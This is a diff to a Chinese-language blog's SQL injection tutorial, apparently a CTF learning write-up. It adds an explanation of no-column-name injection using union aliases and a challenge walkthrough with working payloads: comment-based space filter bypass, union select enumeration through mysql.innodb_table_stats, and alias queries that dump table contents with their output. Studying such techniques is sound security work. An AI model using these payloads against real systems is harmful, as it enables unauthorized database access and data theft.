@@ -887,7 +887,28 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查询数据库名</span><br><span class="line">select table_schema from sys.schema_auto_increment_columns</span><br><span class="line">#查询表名</span><br><span class="line">select table_name from sys.schema_auto_increment_columns where table_schema=databse()</span><br></pre></td></tr></table></figure>
 
 <p>同样的，这个sys库也是能用来查找表名和数据库名的</p>
-<p>那么我们查询完数据库名和表名后</p>
+<p>那么我们查询完数据库名和表名后，就需要对列进行查询，这里有多个方法</p>
+<h5 id="爆列中数据"><a href="#爆列中数据" class="headerlink" title="爆列中数据"></a>爆列中数据</h5><ul>
+<li><h3 id="union取别名"><a href="#union取别名" class="headerlink" title="union取别名"></a>union取别名</h3></li>
+</ul>
+<p>就是通过union语句的特点<strong>将列名转换为任何可选的已知值</strong></p>
+<p>假如我们的查询语句是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 1,2 union select * from users;</span><br></pre></td></tr></table></figure>
+
+<p>我们先本地测试一下</p>
+<p><img src="/../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20250310161630529.png" alt="image-20250310161630529"></p>
+<p>这里可以看到当我们使用上面的语句的时候，就会出现一行派生表列，此时每列的别名就是1，2，3.如果我们不知道列数，因为union 的特点，假如列数不相等就会报错</p>
+<p><strong>这样我们就可以用1，2，3来代替列名了</strong></p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select `2` from (select 1,2,3,4,5 union select * from table)a;</span><br></pre></td></tr></table></figure>
+
+<p>如果反引号被过滤，同样继续用别名代替</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,(select group_concat(a) from(select 1 as a,2 as b,3 as c,4 as d union select * from tp_user)as m),3#</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h3 id="利用join爆列名"><a href="#利用join爆列名" class="headerlink" title="利用join爆列名"></a>利用join爆列名</h3></li>
+</ul>
+<p>条件是页面有回显才能使用</p>
 <h2 id="sqlite注入"><a href="#sqlite注入" class="headerlink" title="sqlite注入"></a>sqlite注入</h2><p>基础知识参考:<a href="https://www.runoob.com/sqlite/sqlite-tutorial.html">菜鸟教程</a></p>
 <p>什么是sqlite?</p>
 <p>SQLite 是一个轻量级的关系型数据库管理系统（RDBMS），它以 C 语言编写，SQLite是一个进程内的库，实现了自给自足的、无服务器的、零配置的、事务性的 SQL 数据库引擎。</p>
@@ -2441,7 +2462,10 @@
 <p>传入<code>1/**/or/**/true</code>回显admin弹窗，用<code>/**/</code>可以绕过空格</p>
 <p>所以这里的话应该是要打盲注+无列名注入</p>
 <p>先测一下字段数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/order/**/by/**/1---------传入2报错，字段数为1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/order/**/by/**/1---------传入2报错，字段数为1</span><br><span class="line">-1/**/union/**/select/**/1---------回显1(注意这里要填-1才会返回1的结果，不然返回位置会被1的查询结果占据)</span><br><span class="line">-1/**/union/**/select/**/database()-----回显web,当前数据库为web</span><br><span class="line">-1/**/union/**/select/**/(select/**/group_concat(table_name)from/**/mysql.innodb_table_stats/**/where/**/database_name=&#x27;web&#x27;)---------回显content表名，这里使用了innodb_table_stats获取表名</span><br><span class="line">利用union别名查询每列的数据</span><br><span class="line">-1/**/union/**/select/**/(select/**/group_concat(`1`)from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)as/**/a) ------1,1,2,3</span><br><span class="line">-1/**/union/**/select/**/(select/**/group_concat(`2`)from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)as/**/a) ------2,admin,gtf1y,Wow</span><br><span class="line">-1/**/union/**/select/**/(select/**/group_concat(`3`)from/**/(select/**/1,2,3/**/union/**/select/**/*/**/from/**/content)as/**/a)---3,flag is not here!,wow,you can really dance,tell you a secret,secret has a secret...</span><br></pre></td></tr></table></figure>
+
+<p>Flag 不在数据库中，可能还得mysql读取敏感文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/user()------先看一下</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
